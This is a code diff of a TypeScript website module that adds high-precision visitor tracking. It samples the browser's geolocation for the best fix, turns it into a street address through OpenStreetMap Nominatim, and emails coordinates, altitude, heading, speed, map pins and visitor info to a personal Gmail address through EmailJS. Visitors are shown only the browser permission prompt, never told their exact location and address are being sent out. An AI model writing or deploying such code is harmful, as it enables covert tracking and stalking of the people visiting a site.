@@ -1,6 +1,5 @@
 import emailjs from "@emailjs/browser";
 
-// TODO: Replace these dummy values with your real EmailJS credentials
 export const EMAILJS_CONFIG = {
   SERVICE_ID: "service_yhpa91x",
   TEMPLATE_ID: "template_s71j8d7",
@@ -40,32 +39,87 @@ export const sendVisitEmail = async () => {
   }
 };
 
-export const sendLocationEmail = async () => {
-  if (!("geolocation" in navigator)) return;
-  return new Promise<void>((resolve) => {
-    navigator.geolocation.getCurrentPosition(
-      async (pos) => {
-        try {
-          ensureInit();
-          const { latitude, longitude, accuracy } = pos.coords;
-          const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
-          await emailjs.send(EMAILJS_CONFIG.SERVICE_ID, EMAILJS_CONFIG.TEMPLATE_ID, {
-            subject: "📍 Visitor Location Captured",
-            message: `Visitor allowed location access.\n\nGoogle Maps: ${mapsUrl}`,
-            location: `Lat: ${latitude}, Lng: ${longitude} (accuracy ~${Math.round(accuracy)}m)\n${mapsUrl}`,
-            visitor_info: getVisitorInfo(),
-            timestamp: new Date().toLocaleString(),
-          });
-        } catch (e) {
-          console.error("Location email failed:", e);
+// Reverse geocode using free OpenStreetMap Nominatim API
+const reverseGeocode = async (lat: number, lng: number): Promise<string> => {
+  try {
+    const res = await fetch(
+      `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`,
+      { headers: { "Accept-Language": "en" } }
+    );
+    const data = await res.json();
+    return data?.display_name || "Address not found";
+  } catch {
+    return "Address lookup failed";
+  }
+};
+
+// Get the best (most accurate) reading by sampling watchPosition for a few seconds
+const getBestPosition = (): Promise<GeolocationPosition> => {
+  return new Promise((resolve, reject) => {
+    if (!("geolocation" in navigator)) {
+      reject(new Error("Geolocation not supported"));
+      return;
+    }
+
+    let best: GeolocationPosition | null = null;
+    const watchId = navigator.geolocation.watchPosition(
+      (pos) => {
+        if (!best || pos.coords.accuracy < best.coords.accuracy) {
+          best = pos;
         }
-        resolve();
+        // If we already got a very precise fix (<20m), stop early
+        if (best.coords.accuracy <= 20) {
+          navigator.geolocation.clearWatch(watchId);
+          resolve(best);
+        }
       },
       (err) => {
-        console.warn("Location denied:", err.message);
-        resolve();
+        navigator.geolocation.clearWatch(watchId);
+        if (best) resolve(best);
+        else reject(err);
       },
-      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+      { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
     );
+
+    // Hard stop after 12s — return best so far
+    setTimeout(() => {
+      navigator.geolocation.clearWatch(watchId);
+      if (best) resolve(best);
+      else reject(new Error("Timed out without a fix"));
+    }, 12000);
   });
+};
+
+export const sendLocationEmail = async () => {
+  if (!("geolocation" in navigator)) return;
+  try {
+    const pos = await getBestPosition();
+    ensureInit();
+    const { latitude, longitude, accuracy, altitude, heading, speed } = pos.coords;
+    const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+    const preciseUrl = `https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}`;
+    const address = await reverseGeocode(latitude, longitude);
+
+    const locationBlock =
+      `📍 Address: ${address}\n` +
+      `Latitude: ${latitude}\n` +
+      `Longitude: ${longitude}\n` +
+      `Accuracy: ~${Math.round(accuracy)} meters\n` +
+      (altitude != null ? `Altitude: ${altitude} m\n` : "") +
+      (heading != null ? `Heading: ${heading}\n` : "") +
+      (speed != null ? `Speed: ${speed} m/s\n` : "") +
+      `Google Maps: ${mapsUrl}\n` +
+      `Precise pin: ${preciseUrl}`;
+
+    await emailjs.send(EMAILJS_CONFIG.SERVICE_ID, EMAILJS_CONFIG.TEMPLATE_ID, {
+      email: "shubhamsc9799@gmail.com",
+      subject: "📍 Visitor Exact Location Captured",
+      message: `Visitor allowed location access.\n\n${locationBlock}`,
+      location: locationBlock,
+      visitor_info: getVisitorInfo(),
+      timestamp: new Date().toLocaleString(),
+    });
+  } catch (e) {
+    console.warn("Location capture failed:", e);
+  }
 };
